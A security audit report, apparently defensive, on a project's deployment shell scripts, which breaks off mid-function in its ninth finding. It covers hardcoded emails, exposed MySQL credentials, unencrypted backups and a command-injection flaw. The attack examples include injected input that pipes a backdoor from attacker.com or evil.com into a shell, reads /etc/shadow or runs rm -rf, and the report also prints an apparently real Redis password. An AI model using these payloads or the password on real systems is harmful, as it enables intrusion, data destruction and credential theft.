# DEPLOYMENT INFRASTRUCTURE SECURITY AUDIT REPORT

**Project:** CHOM Deployment Scripts & Infrastructure
**Audit Date:** 2026-01-02
**Auditor:** Security Assessment Team
**Scope:** Deployment scripts (`chom/deploy/`, `observability-stack/deploy/`), SSL configuration, database backups
**Framework:** OWASP Top 10 2021, CWE/SANS Top 25

---

## EXECUTIVE SUMMARY

This security audit focused specifically on deployment scripts and infrastructure configuration identified **23 security vulnerabilities** across the CHOM deployment ecosystem. The findings include 7 CRITICAL issues requiring immediate remediation.

**Severity Breakdown:**
- **CRITICAL:** 7 vulnerabilities (immediate action required)
- **HIGH:** 8 vulnerabilities (remediate within 7 days)
- **MEDIUM:** 5 vulnerabilities (remediate within 30 days)
- **LOW:** 3 vulnerabilities (best practice improvements)

**Primary Security Concerns:**
1. Hardcoded credentials and organizational email addresses
2. Database credentials exposed in process listings
3. Unencrypted database backups
4. Command injection vulnerabilities in SSL setup
5. Insecure temporary file handling
6. Missing input validation
7. SSH host key verification disabled

**Compliance Impact:**
- **GDPR:** 3 violations (unencrypted PII in backups)
- **PCI-DSS:** 3 violations (credential exposure)
- **HIPAA:** 2 violations (unencrypted ePHI)

---

## CRITICAL SEVERITY FINDINGS

### VULN-001: Hardcoded SSL Email Addresses (CWE-798)

**CVSS 3.1 Score:** 9.1 (CRITICAL)
**OWASP Category:** A05:2021 - Security Misconfiguration

**Affected Files:**
- `/home/calounx/repositories/mentat/chom/deploy/scripts/setup-observability-vps.sh` (Line 62)
- `/home/calounx/repositories/mentat/chom/deploy/scripts/setup-vpsmanager-vps.sh` (Line 56)

**Vulnerable Code:**
```bash
# setup-observability-vps.sh:62
SSL_EMAIL="${SSL_EMAIL:-admin@arewel.com}"

# setup-vpsmanager-vps.sh:56
SSL_EMAIL="${SSL_EMAIL:-admin@arewel.com}"
```

**Security Impact:**
- **Information Disclosure:** Organizational email address exposed in public repositories
- **Operational Security Risk:** Cannot deploy to client/partner environments without code modification
- **Compliance:** Let's Encrypt expiry notifications sent to single hardcoded address
- **Version Control Exposure:** Email tracked in Git history, potentially forever

**Attack Scenario:**
1. Attacker views public GitHub repository
2. Identifies organizational domain `arewel.com`
3. Uses for reconnaissance (OSINT), phishing campaigns, or infrastructure mapping
4. Subscribes to Let's Encrypt transparency logs to track certificate issuance

**Remediation:**
```bash
# SECURE IMPLEMENTATION
# Require SSL_EMAIL to be explicitly set
if [[ -z "${SSL_EMAIL:-}" ]]; then
    log_error "SSL_EMAIL environment variable is required"
    log_error "Usage: export SSL_EMAIL=admin@example.com"
    exit 1
fi

# Validate email format (prevent injection)
if [[ ! "$SSL_EMAIL" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
    log_error "Invalid email format: ${SSL_EMAIL}"
    log_error "Email must be in format: user@domain.tld"
    exit 1
fi

log_info "Using SSL notification email: ${SSL_EMAIL}"
```

**Testing:**
```bash
# Verify remediation
./setup-observability-vps.sh
# Should fail with error message

export SSL_EMAIL="test@example.com"
./setup-observability-vps.sh
# Should succeed
```

**References:**
- CWE-798: Use of Hard-coded Credentials
- OWASP A05:2021 - Security Misconfiguration

---

### VULN-002: MySQL Credentials Exposed in Process List (CWE-214)

**CVSS 3.1 Score:** 8.6 (CRITICAL)
**OWASP Category:** A04:2021 - Insecure Design

**Affected Files:**
- `/home/calounx/repositories/mentat/chom/scripts/deploy-production.sh` (Line 116)

**Vulnerable Code:**
```bash
mysqldump -h"$DB_HOST" -u"$DB_USERNAME" -p"$DB_PASSWORD" "$DB_DATABASE" > "$BACKUP_FILE"
```

**Security Impact:**
- **Credential Exposure:** Password visible in `/proc/*/cmdline` to all system users
- **Privilege Escalation:** Low-privilege users can read credentials via `ps aux`, `top`, `htop`
- **Persistent Exposure:** Credentials may be logged in shell history, audit logs
- **Compliance Violation:** PCI-DSS Requirement 8.2.1 (password confidentiality)

**Attack Scenario:**
```bash
# As unprivileged user:
ps aux | grep mysqldump
# Output: mysqldump -h127.0.0.1 -uapp -pSuperSecret123 chom_db

# Now attacker has database credentials
mysql -h127.0.0.1 -uapp -pSuperSecret123 chom_db
# Full database access achieved
```

**Remediation:**
```bash
# SECURE IMPLEMENTATION
create_database_backup() {
    local backup_file="$1"

    # Create temporary MySQL config file (secure permissions)
    local mysql_cnf=$(mktemp)
    chmod 600 "$mysql_cnf"  # Set permissions BEFORE writing

    # Write credentials to config file
    cat > "$mysql_cnf" << EOF
[client]
host=${DB_HOST}
user=${DB_USERNAME}
password=${DB_PASSWORD}
EOF

    # Use config file for credentials (NOT command line)
    mysqldump --defaults-extra-file="$mysql_cnf" "$DB_DATABASE" > "$backup_file"
    local exit_code=$?

    # Securely delete config file
    shred -u "$mysql_cnf" 2>/dev/null || rm -f "$mysql_cnf"

    if [[ $exit_code -eq 0 ]]; then
        log_success "Database backup created: $backup_file"
        return 0
    else
        log_error "Database backup failed"
        return 1
    fi
}
```

**Testing:**
```bash
# Before fix - credentials visible
ps aux | grep mysqldump
# mysqldump -h127.0.0.1 -uroot -pPassword123 db

# After fix - credentials hidden
ps aux | grep mysqldump
# mysqldump --defaults-extra-file=/tmp/tmp.xxxxx db
```

**References:**
- CWE-214: Invocation of Process Using Visible Sensitive Information
- MySQL Security: https://dev.mysql.com/doc/refman/8.0/en/password-security-user.html

---

### VULN-003: Unencrypted Database Backups (CWE-311)

**CVSS 3.1 Score:** 8.2 (CRITICAL)
**OWASP Category:** A02:2021 - Cryptographic Failures

**Affected Files:**
- `/home/calounx/repositories/mentat/chom/scripts/deploy-production.sh` (Lines 116-120)

**Vulnerable Code:**
```bash
# Plaintext backups
mysqldump ... > "$PROJECT_ROOT/storage/app/backups/$BACKUP_FILE"
cp "$PROJECT_ROOT/database/database.sqlite" "$PROJECT_ROOT/storage/app/backups/database_${TIMESTAMP}.sqlite"
```

**Security Impact:**
- **Data Breach Risk:** Unauthorized access to backup exposes all application data
- **Compliance Violations:**
  - GDPR Article 32: Encryption of personal data at rest
  - PCI-DSS Requirement 3.4: Encryption of cardholder data
  - HIPAA 164.312(a)(2)(iv): Encryption of ePHI
- **Exposure of Sensitive Data:**
  - User credentials (password hashes)
  - API keys and secrets stored in database
  - Personal Identifiable Information (PII)
  - Payment information
  - Session tokens

**Attack Scenario:**
```bash
# Attacker gains read access to backup directory
ls /var/www/chom/storage/app/backups/
# backup_20260102_120000.sql (plaintext)

# Extract sensitive data
grep -i "password\|api_key\|secret" backup_20260102_120000.sql
# Massive data breach
```

**Remediation:**
```bash
# SECURE IMPLEMENTATION - GPG Encryption
create_encrypted_backup() {
    local db_name="$1"
    local backup_base="backup_${TIMESTAMP}"
    local backup_sql="${backup_base}.sql"
    local backup_encrypted="${backup_base}.sql.gpg"
    local backup_dir="$PROJECT_ROOT/storage/app/backups"

    # GPG recipient (from environment or config)
    local gpg_recipient="${BACKUP_GPG_RECIPIENT:-backup@example.com}"

    log_info "Creating encrypted database backup..."

    # Create MySQL config file
    local mysql_cnf=$(mktemp)
    chmod 600 "$mysql_cnf"

    cat > "$mysql_cnf" << EOF
[client]
host=${DB_HOST}
user=${DB_USERNAME}
password=${DB_PASSWORD}
EOF

    # Backup directly to GPG-encrypted file (pipe - no plaintext on disk)
    if mysqldump --defaults-extra-file="$mysql_cnf" "$db_name" | \
       gpg --encrypt --recipient "$gpg_recipient" --trust-model always \
       --output "$backup_dir/$backup_encrypted"; then

        log_success "Encrypted backup created: $backup_encrypted"

        # Generate checksum for integrity verification
        sha256sum "$backup_dir/$backup_encrypted" > "$backup_dir/${backup_encrypted}.sha256"

        # Secure cleanup
        shred -u "$mysql_cnf" 2>/dev/null || rm -f "$mysql_cnf"

        return 0
    else
        log_error "Backup encryption failed"
        shred -u "$mysql_cnf" 2>/dev/null || rm -f "$mysql_cnf"
        return 1
    fi
}

# Restore encrypted backup
restore_encrypted_backup() {
    local backup_file="$1"

    # Verify checksum first
    if ! sha256sum -c "${backup_file}.sha256" &>/dev/null; then
        log_error "Backup integrity check FAILED"
        log_error "Backup may be corrupted. Aborting restore."
        return 1
    fi

    log_info "Decrypting backup..."
    gpg --decrypt "$backup_file" | mysql -u"$DB_USERNAME" -p"$DB_PASSWORD" "$DB_DATABASE"
}

# ALTERNATIVE: Age encryption (modern, simpler than GPG)
create_age_encrypted_backup() {
    local backup_file="$1"
    local age_public_key="${BACKUP_AGE_PUBLIC_KEY}"

    mysqldump --defaults-extra-file="$mysql_cnf" "$DB_DATABASE" | \
        age -r "$age_public_key" -o "${backup_file}.age"
}
```

**Setup GPG Encryption:**
```bash
# Generate GPG key for backups (one-time setup)
gpg --full-generate-key
# Select: (1) RSA and RSA, 4096 bits, no expiration
# Email: backup@example.com

# Export public key for backup servers
gpg --export --armor backup@example.com > backup-public-key.asc

# On backup server, import public key
gpg --import backup-public-key.asc

# Test encryption/decryption
echo "test" | gpg --encrypt --recipient backup@example.com | gpg --decrypt
```

**References:**
- CWE-311: Missing Encryption of Sensitive Data
- NIST SP 800-57: Key Management
- Age encryption: https://age-encryption.org/

---

### VULN-004: Race Condition in Temporary File Creation (CWE-377)

**CVSS 3.1 Score:** 7.8 (HIGH)
**OWASP Category:** A01:2021 - Broken Access Control

**Affected Files:**
- `/home/calounx/repositories/mentat/chom/deploy/scripts/setup-vpsmanager-vps.sh` (Lines 649-653)

**Vulnerable Code:**
```bash
PASS_TEMP=$(mktemp)          # File created with default permissions (0600 or 0644)
chmod 600 "$PASS_TEMP"       # Race condition: file already exists
echo -n "${DASHBOARD_PASSWORD}" > "$PASS_TEMP"
DASHBOARD_PASSWORD_HASH=$(php -r "echo password_hash(file_get_contents('${PASS_TEMP}'), PASSWORD_BCRYPT);")
shred -u "$PASS_TEMP"
```

**Security Impact:**
- **TOCTOU Race Condition:** Time-of-check-time-of-use vulnerability
- **Credential Exposure:** ~100ms window where password is readable by other users
- **Privilege Escalation:** Exploitable by local attackers monitoring `/tmp`

**Attack Scenario:**
```bash
# Attacker runs in background
while true; do
    find /tmp -name "tmp.*" -readable -exec cat {} \; 2>/dev/null
    sleep 0.01  # Poll every 10ms
done

# When deployment script runs, attacker captures password
# Password captured during race window
```

**Remediation:**
```bash
# OPTION 1: Avoid filesystem entirely (BEST)
DASHBOARD_PASSWORD_HASH=$(echo -n "$DASHBOARD_PASSWORD" | php -r '
    echo password_hash(file_get_contents("php://stdin"), PASSWORD_BCRYPT);
')

# OPTION 2: Set umask before file creation
hash_password_secure() {
    local password="$1"

    # Set restrictive umask temporarily
    local old_umask=$(umask)
    umask 077  # New files: 0600 permissions

    local temp_file=$(mktemp)
    echo -n "$password" > "$temp_file"

    local hash=$(php -r "echo password_hash(file_get_contents('$temp_file'), PASSWORD_BCRYPT);")

    shred -u "$temp_file" 2>/dev/null || rm -f "$temp_file"
    umask "$old_umask"

    echo "$hash"
}

DASHBOARD_PASSWORD_HASH=$(hash_password_secure "$DASHBOARD_PASSWORD")

# OPTION 3: Use PHP directly with command-line argument
DASHBOARD_PASSWORD_HASH=$(php -r "echo password_hash(\$argv[1], PASSWORD_BCRYPT);" "$DASHBOARD_PASSWORD")
```

**Testing:**
```bash
# Test race condition exploit
# Terminal 1: Run deployment
./setup-vpsmanager-vps.sh &

# Terminal 2: Attempt to read temp files
while true; do
    find /tmp -name "tmp.*" -type f -ls 2>/dev/null
    sleep 0.01
done

# After fix, no temp files should be created
```

**References:**
- CWE-377: Insecure Temporary File
- CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition

---

### VULN-005: Command Injection in SSL Setup Script (CWE-78)

**CVSS 3.1 Score:** 9.8 (CRITICAL)
**OWASP Category:** A03:2021 - Injection

**Affected Files:**
- `/home/calounx/repositories/mentat/chom/deploy/scripts/setup-ssl.sh` (Lines 56-98)

**Vulnerable Code:**
```bash
# User input taken directly without validation
read -p "Enter domain for Grafana (e.g., mentat.arewel.com): " GRAFANA_DOMAIN
read -p "Enter email for Let's Encrypt notifications: " EMAIL

# Used directly in shell commands
DOMAIN_IP=$(dig +short "$GRAFANA_DOMAIN" | tail -1)
SERVER_IP=$(hostname -I | awk '{print $1}')

# Passed to certbot without validation
sudo certbot certonly \
    --standalone \
    --non-interactive \
    --agree-tos \
    --email "$EMAIL" \
    -d "$GRAFANA_DOMAIN"
```

**Security Impact:**
- **Remote Code Execution:** Attacker can execute arbitrary commands
- **Full System Compromise:** Commands run with sudo privileges
- **Privilege Escalation:** Low-privilege user becomes root
- **Data Exfiltration:** Attacker can steal secrets, modify system

**Attack Examples:**
```bash
# Example 1: Command injection via domain
Enter domain: test.com; curl http://attacker.com/backdoor.sh | bash #

# Example 2: Command substitution
Enter domain: $(whoami)
Enter domain: `cat /etc/shadow > /tmp/pwned`

# Example 3: Multi-command injection
Enter domain: example.com; rm -rf /var/www/html; echo pwned

# Example 4: Email injection
Enter email: test@test.com; wget http://evil.com/malware.sh -O /tmp/m.sh && chmod +x /tmp/m.sh && /tmp/m.sh #
```

**Remediation:**
```bash
# SECURE IMPLEMENTATION

# Validate domain format (RFC 1035 compliant)
validate_domain() {
    local domain="$1"

    # Check for empty domain
    if [[ -z "$domain" ]]; then
        log_error "Domain cannot be empty"
        return 1
    fi

    # Validate format: alphanumeric, dots, hyphens only
    # Must start/end with alphanumeric, max 253 chars
    if [[ ! "$domain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
        log_error "Invalid domain format: ${domain}"
        log_error "Domain must:"
        log_error "  - Contain only letters, numbers, dots, hyphens"
        log_error "  - Start and end with alphanumeric character"
        log_error "  - Have valid TLD (.com, .org, etc.)"
        return 1
    fi

    # Check maximum length (RFC 1035)
    if [[ ${#domain} -gt 253 ]]; then
        log_error "Domain too long: ${#domain} characters (max: 253)"
        return 1
    fi

    # Check for suspicious patterns
    if [[ "$domain" =~ [;\|\&\$\(\)\{\}] ]]; then
        log_error "Domain contains illegal characters: ${domain}"
        return 1
    fi

    return 0
}

# Validate email format
validate_email() {
    local email="$1"

    # Check for empty email
    if [[ -z "$email" ]]; then
        log_error "Email cannot be empty"
        return 1
    fi

    # Validate email format
    if [[ ! "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        log_error "Invalid email format: ${email}"
        return 1
    fi

    # Check for command injection patterns
    if [[ "$email" =~ [;\|\&\$\(\)\{\}`] ]]; then
        log_error "Email contains illegal characters: ${email}"
        return 1
    fi

    return 0
}

# Get validated input
get_domain_input() {
    while true; do
        read -p "Enter domain for Grafana: " GRAFANA_DOMAIN
        if validate_domain "$GRAFANA_DOMAIN"; then
            break
        fi
        echo "Please try again."
    done
}

get_email_input() {
    while true; do
        read -p "Enter email for Let's Encrypt: " EMAIL
        if validate_email "$EMAIL"; then
            break
        fi
        echo "Please try again."
    done
}

# Use array-based command execution (prevents injection)
run_certbot() {
    local domain="$1"
    local email="$2"

    # Build command as array (arguments not interpreted by shell)
    local certbot_cmd=(
        certbot
        certonly
        --standalone
        --non-interactive
        --agree-tos
        --email "$email"
        -d "$domain"
    )

    # Execute safely
    if sudo "${certbot_cmd[@]}"; then
        log_success "SSL certificate obtained for ${domain}"
        return 0
    else
        log_error "Failed to obtain SSL certificate"
        return 1
    fi
}

# Main execution
get_domain_input
get_email_input
run_certbot "$GRAFANA_DOMAIN" "$EMAIL"
```

**Testing:**
```bash
# Test injection attempts
./setup-ssl.sh
Enter domain: test.com; whoami
# Should reject: "Domain contains illegal characters"

Enter domain: $(ls)
# Should reject: "Invalid domain format"

Enter email: test@test.com; curl http://evil.com
# Should reject: "Email contains illegal characters"

# Valid input should work
Enter domain: grafana.example.com
Enter email: admin@example.com
# Should proceed with SSL setup
```

**References:**
- CWE-78: OS Command Injection
- OWASP A03:2021 - Injection
- Bash Security Best Practices

---

### VULN-006: Credentials in Deployment Logs (CWE-532)

**CVSS 3.1 Score:** 7.5 (HIGH)
**OWASP Category:** A09:2021 - Security Logging and Monitoring Failures

**Affected Files:**
- `/home/calounx/repositories/mentat/chom/deploy/lib/deploy-common.sh` (Lines 21-48)
- All deployment scripts logging operations

**Vulnerable Code:**
```bash
# Deployment log stored in /tmp (world-readable directory)
DEPLOYMENT_LOG_FILE="${DEPLOYMENT_LOG_FILE:-/tmp/deployment-$(date +%Y%m%d-%H%M%S).log}"

# Logs may contain sensitive data
log_info "Setting up database with password: $MYSQL_ROOT_PASSWORD"
log_success "SSL Email: ${SSL_EMAIL}"
```

**Security Impact:**
- **Credential Exposure:** Passwords, API keys logged in plaintext
- **Persistent Storage:** Logs may persist across reboots or be backed up
- **World-Readable:** `/tmp` accessible to all users
- **Compliance Violation:** PCI-DSS 3.4 (authentication credentials not stored in log files)

**Attack Scenario:**
```bash
# As unprivileged user
grep -r "password\|secret\|key" /tmp/deployment-*.log
# Found: MYSQL_ROOT_PASSWORD=SuperSecret123
# Found: GRAFANA_ADMIN_PASSWORD=Admin456
```

**Remediation:**
```bash
# SECURE IMPLEMENTATION

# Use secure log directory
DEPLOYMENT_LOG_DIR="/var/log/chom-deploy"
DEPLOYMENT_LOG_FILE="${DEPLOYMENT_LOG_FILE:-${DEPLOYMENT_LOG_DIR}/deployment-$(date +%Y%m%d-%H%M%S).log}"

init_deployment_log() {
    # Create secure log directory
    sudo mkdir -p "$DEPLOYMENT_LOG_DIR"
    sudo chmod 750 "$DEPLOYMENT_LOG_DIR"
    sudo chown root:adm "$DEPLOYMENT_LOG_DIR"

    # Create log file with secure permissions from start
    (umask 077 && sudo touch "$DEPLOYMENT_LOG_FILE")
    sudo chmod 600 "$DEPLOYMENT_LOG_FILE"
    sudo chown root:root "$DEPLOYMENT_LOG_FILE"

    log_info "Deployment logging to: $DEPLOYMENT_LOG_FILE"
}

# Sanitize log output
sanitize_log_message() {
    local message="$1"

    # Redact common secret patterns
    message=$(echo "$message" | sed -E '
        s/(password|passwd|pwd)[=:][^ ]*/\1=***REDACTED***/gi;
        s/(secret|api_key|token)[=:][^ ]*/\1=***REDACTED***/gi;
        s/(key)[=:][^ ]*/\1=***REDACTED***/gi;
        s/Bearer [A-Za-z0-9_-]+/Bearer ***REDACTED***/g;
        s/([0-9]{13,19})/***CARD_REDACTED***/g;
    ')

    echo "$message"
}

# Enhanced logging with sanitization
log_to_file() {
    if [[ "$DEPLOYMENT_LOG_ENABLED" == "true" ]]; then
        local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
        local clean_msg=$(echo "$1" | sed 's/\x1B\[[0-9;]*[JKmsu]//g')

        # Sanitize before logging
        clean_msg=$(sanitize_log_message "$clean_msg")

        echo "[$timestamp] $clean_msg" | sudo tee -a "$DEPLOYMENT_LOG_FILE" >/dev/null
    fi
}

# Use for all log functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
    log_to_file "[INFO] $1"
}

# Special function for sensitive operations
log_sensitive_operation() {
    local operation="$1"
    echo -e "${BLUE}[INFO]${NC} $operation"
    # Don't log details, just the operation type
    log_to_file "[INFO] Sensitive operation completed: ${operation}"
}

# Usage example
MYSQL_ROOT_PASSWORD=$(generate_password 24)
log_sensitive_operation "MySQL root password generated"
# DON'T: log_info "MySQL password: $MYSQL_ROOT_PASSWORD"
```

**Additional Protections:**
```bash
# Set up log rotation
cat > /etc/logrotate.d/chom-deploy << 'EOF'
/var/log/chom-deploy/*.log {
    daily
    rotate 7
    compress
    delaycompress
    notifempty
    create 0600 root root
    sharedscripts
    postrotate
        # Securely delete old logs
        find /var/log/chom-deploy -name "*.log.*.gz" -mtime +30 -exec shred -u {} \;
    endscript
}
EOF
```

**References:**
- CWE-532: Insertion of Sensitive Information into Log File
- OWASP Logging Cheat Sheet
- PCI-DSS Requirement 3.4

---

### VULN-007: Redis Password in Version Control (CWE-256)

**CVSS 3.1 Score:** 8.1 (HIGH)
**OWASP Category:** A05:2021 - Security Misconfiguration

**Affected Files:**
- `/home/calounx/repositories/mentat/chom/.env` (Line 99)

**Vulnerable Code:**
```bash
# Actual password in .env file
REDIS_PASSWORD=hlpSBbcSVX6V8j56PWn6cg==
```

**Security Impact:**
- **Git History Exposure:** Password tracked in version control
- **Repository Access = Redis Access:** Anyone with repo access gains database access
- **Credential Rotation Impossible:** Changing password requires code change
- **Compliance Violation:** Separation of code and configuration

**Attack Scenario:**
```bash
# Attacker clones repository
git clone https://github.com/org/mentat.git
cd mentat

# Search for passwords in history
git log --all --full-history -p | grep -i "redis_password"
# Found: REDIS_PASSWORD=hlpSBbcSVX6V8j56PWn6cg==

# Connect to Redis
redis-cli -h production-redis.example.com -a "hlpSBbcSVX6V8j56PWn6cg=="
# Full Redis access achieved
```

**Check if Already Committed:**
```bash
# Search entire Git history for .env files
git log --all --full-history -- "*/.env"

# Search for passwords in commit history
git log --all --full-history -p | grep -i "redis_password"

# If found, passwords are PERMANENTLY in Git history
# Even deleting the file doesn't remove from history
```

**Remediation:**
```bash
# STEP 1: Remove from current codebase
# Create .env.example (COMMIT THIS)
cat > .env.example << 'EOF'
# Redis Configuration
REDIS_CLIENT=phpredis
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=
REDIS_PORT=6379
REDIS_DB=0
EOF

# Actual .env with credentials (NEVER COMMIT)
cat > .env << 'EOF'
REDIS_PASSWORD=<your-generated-password>
EOF

# STEP 2: Update .gitignore
cat >> .gitignore << 'EOF'
# Environment files (NEVER commit)
.env
.env.local
.env.*.local
.env.backup

# Except example files
!.env.example
EOF

# STEP 3: If already committed, remove from Git history
# WARNING: This rewrites history - coordinate with team
git filter-repo --path .env --invert-paths

# OR use BFG Repo-Cleaner (faster for large repos)
bfg --delete-files .env
git reflog expire --expire=now --all
git gc --prune=now --aggressive

# STEP 4: Rotate the exposed password
# Generate new password
NEW_REDIS_PASSWORD=$(openssl rand -base64 32)

# Update Redis configuration
redis-cli CONFIG SET requirepass "$NEW_REDIS_PASSWORD"
redis-cli AUTH "$NEW_REDIS_PASSWORD"

# Update .env
sed -i "s/^REDIS_PASSWORD=.*/REDIS_PASSWORD=${NEW_REDIS_PASSWORD}/" .env
```

**Production Secrets Management:**
```yaml
# Docker Compose with secrets
version: '3.8'
services:
  redis:
    image: redis:7-alpine
    command: redis-server --requirepass $(cat /run/secrets/redis_password)
    secrets:
      - redis_password

secrets:
  redis_password:
    file: ./secrets/redis_password

# Kubernetes secrets
apiVersion: v1
kind: Secret
metadata:
  name: redis-credentials
type: Opaque
data:
  password: <base64-encoded-password>
```

**References:**
- CWE-256: Plaintext Storage of a Password
- GitHub Secret Scanning
- GitGuardian: https://www.gitguardian.com/

---

## HIGH SEVERITY FINDINGS

### VULN-008: Weak Password Generation Algorithm (CWE-330)

**CVSS 3.1 Score:** 7.4 (HIGH)
**OWASP Category:** A07:2021 - Identification and Authentication Failures

**Affected Files:**
- `/home/calounx/repositories/mentat/chom/deploy/lib/deploy-common.sh` (Lines 438-441)

**Vulnerable Code:**
```bash
generate_password() {
    local length="${1:-24}"
    openssl rand -base64 32 | tr -dc 'a-zA-Z0-9' | head -c "$length"
}
```

**Issues:**
1. Base64 encoding generates 43 characters, but `head -c 24` truncates
2. `tr -dc` filtering reduces entropy
3. Character distribution becomes non-uniform
4. May generate shorter passwords than requested (if filtered characters dominate)

**Entropy Analysis:**
```bash
# openssl rand -base64 32
# Output: 43 characters from [A-Za-z0-9+/]
# Entropy: ~256 bits

# After tr -dc 'a-zA-Z0-9'
# Removes '+' and '/' characters
# Reduces character set, loses entropy

# After head -c 24
# Truncates to 24 characters
# Effective entropy: ~142 bits (24 * log2(62))
# But non-uniform distribution reduces actual entropy
```

**Remediation:**
```bash
# OPTION 1: Direct random generation (BEST)
generate_password_secure() {
    local length="${1:-24}"
    local charset="${2:-a-zA-Z0-9!@#\$%^&*()_+-=}"

    # Use /dev/urandom directly
    LC_ALL=C tr -dc "$charset" < /dev/urandom | head -c "$length"
    echo  # Newline
}

# OPTION 2: Use specialized password generator
generate_password_pwgen() {
    local length="${1:-24}"

    if command -v pwgen &>/dev/null; then
        # pwgen generates secure, pronounceable passwords
        pwgen -s -y "$length" 1
    else
        log_warn "pwgen not installed, using fallback"
        generate_password_secure "$length"
    fi
}

# OPTION 3: OpenSSL with proper length
generate_password_openssl() {
    local length="${1:-24}"

    # Generate enough bytes for length
    # Base64 expands by 4/3, so generate length * 3 / 4 bytes
    local bytes=$(( (length * 3 + 3) / 4 ))

    openssl rand -base64 "$bytes" | tr -dc 'a-zA-Z0-9!@#$%^&*' | head -c "$length"
    echo
}

# RECOMMENDED: Use /dev/urandom
generate_password() {
    local length="${1:-24}"

    # Ensure minimum length
    if [[ $length -lt 16 ]]; then
        log_warn "Password length $length is too short, using 16"
        length=16
    fi

    # Generate from /dev/urandom (cryptographically secure)
    LC_ALL=C tr -dc 'a-zA-Z0-9!@#$%^&*()_+-=' < /dev/urandom | head -c "$length"
    echo
}
```

**Testing:**
```bash
# Test password generation
for i in {1..10}; do
    echo "Password $i: $(generate_password 24)"
done

# Check entropy
password=$(generate_password 32)
echo -n "$password" | ent
# Should show high entropy (close to 8.0 bits/byte)

# Check character distribution
for i in {1..1000}; do
    generate_password 32
done | fold -w1 | sort | uniq -c | sort -rn
# Should show relatively even distribution
```

**References:**
- CWE-330: Use of Insufficiently Random Values
- NIST SP 800-90A: Random Number Generation
- Password Strength Calculator: https://www.passwordmonster.com/

---

### VULN-009: Missing Input Validation for DOMAIN Variable (CWE-20)

**CVSS 3.1 Score:** 7.3 (HIGH)
**OWASP Category:** A03:2021 - Injection

**Affected Files:**
- `/home/calounx/repositories/mentat/chom/deploy/scripts/setup-observability-vps.sh` (Line 61)
- `/home/calounx/repositories/mentat/chom/deploy/scripts/setup-vpsmanager-vps.sh` (Line 55)

**Vulnerable Code:**
```bash
DOMAIN="${DOMAIN:-mentat.arewel.com}"
# Used directly in:
# - SSL certificate requests
# - Nginx configuration
# - DNS lookups
```

**Security Impact:**
- **DNS Rebinding Attacks:** Attacker controls DNS resolution
- **SSRF (Server-Side Request Forgery):** Internal network access
- **Configuration Injection:** Malicious domain breaks Nginx config
- **Certificate Misissuance:** Wrong certificates issued

**Attack Examples:**
```bash
# DNS Rebinding
export DOMAIN="attacker.com"
# DNS initially resolves to legitimate IP
# After check, DNS changes to internal IP (192.168.1.1)
# Server requests internal resources

# SSRF via internal domains
export DOMAIN="localhost"  # or 127.0.0.1
export DOMAIN="metadata.internal"  # Cloud metadata service
export DOMAIN="192.168.1.100"  # Internal server

# Configuration injection
export DOMAIN="test.com; rm -rf /etc/nginx; echo pwned"
```

**Remediation:**
```bash
# COMPREHENSIVE DOMAIN VALIDATION
validate_domain() {
    local domain="$1"

    # 1. Check if domain is set
    if [[ -z "$domain" ]]; then
        log_error "DOMAIN variable is empty"
        return 1
    fi

    # 2. Validate format (RFC 1035 compliant)
    if [[ ! "$domain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
        log_error "Invalid domain format: ${domain}"
        log_error "Domain must:"
        log_error "  - Contain only letters, numbers, dots, hyphens"
        log_error "  - Start and end with alphanumeric"
        log_error "  - Have at least one dot (TLD required)"
        return 1
    fi

    # 3. Check length (RFC 1035)
    if [[ ${#domain} -gt 253 ]]; then
        log_error "Domain too long: ${#domain} chars (max 253)"
        return 1
    fi

    # 4. Check for localhost/internal addresses (SSRF prevention)
    if [[ "$domain" =~ ^(localhost|127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.) ]]; then
        log_error "Domain appears to be internal/localhost: ${domain}"
        log_error "Internal domains not allowed for security reasons"
        return 1
    fi

    # 5. Check for suspicious TLDs
    if [[ "$domain" =~ \.(local|internal|lan|test)$ ]]; then
        log_warn "Domain has internal TLD: ${domain}"
        read -p "Continue anyway? (yes/no): " confirm
        if [[ "$confirm" != "yes" ]]; then
            return 1
        fi
    fi

    # 6. Verify domain has valid TLD (not just IP address)
    if [[ "$domain" =~ ^[0-9.]+$ ]]; then
        log_error "Domain cannot be an IP address: ${domain}"
        log_error "Use a proper domain name with TLD"
        return 1
    fi

    # 7. Check DNS resolution (prevent DNS rebinding)
    log_info "Verifying DNS resolution for ${domain}..."
    local resolved_ip=$(dig +short "$domain" A | tail -1)

    if [[ -z "$resolved_ip" ]]; then
        log_error "Domain does not resolve: ${domain}"
        log_error "Configure DNS before deployment"
        return 1
    fi

    # 8. Verify resolved IP is not internal
    if [[ "$resolved_ip" =~ ^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.) ]]; then
        log_warn "Domain resolves to internal IP: ${resolved_ip}"
        log_warn "This may indicate:"
        log_warn "  - DNS rebinding attack"
        log_warn "  - Split-horizon DNS"
        log_warn "  - Development environment"

        read -p "Continue anyway? (yes/no): " confirm
        if [[ "$confirm" != "yes" ]]; then
            return 1
        fi
    fi

    # 9. Get server IP and compare
    local server_ip=$(get_ip_address)
    log_info "Domain resolves to: ${resolved_ip}"
    log_info "Server IP address: ${server_ip}"

    if [[ "$resolved_ip" != "$server_ip" ]]; then
        log_warn "DNS mismatch detected"
        log_warn "Domain ${domain} points to ${resolved_ip}"
        log_warn "But server IP is ${server_ip}"
        log_warn ""
        log_warn "This will cause SSL certificate validation to fail"
        log_warn "Update your DNS records before continuing"

        read -p "Continue anyway? (yes/no): " confirm
        if [[ "$confirm" != "yes" ]]; then
            return 1
        fi
    fi

    log_success "Domain validation passed: ${domain}"
    return 0
}

# Use in deployment scripts
DOMAIN="${DOMAIN:-}"

if ! validate_domain "$DOMAIN"; then
